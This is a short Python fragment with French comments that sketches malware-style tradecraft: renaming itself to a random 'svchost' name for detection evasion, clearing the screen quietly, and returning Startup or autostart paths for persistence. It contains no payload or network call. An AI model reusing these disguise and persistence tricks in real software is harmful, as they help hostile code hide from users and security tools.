import os
import sys
import random
import time
import subprocess
from pathlib import Path

def evade_detection():
    """Techniques d'évasion de détection"""
    try:
        os.rename(sys.argv[0], f"svchost{random.randint(1000,9999)}.py")
    except:
        pass
    time.sleep(random.uniform(0.5, 2.0))

def clear_screen():
    """Efface l'écran de manière furtive"""
    subprocess.run(['cls' if os.name == 'nt' else 'clear'], 
                  shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def simulate_persistence():
    """Simule la persistance (registry/startup)"""
    if os.name == 'nt':
        path = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svchost.py")
    else:
        path = Path.home() / ".config/autostart/svchost.service"
    return path
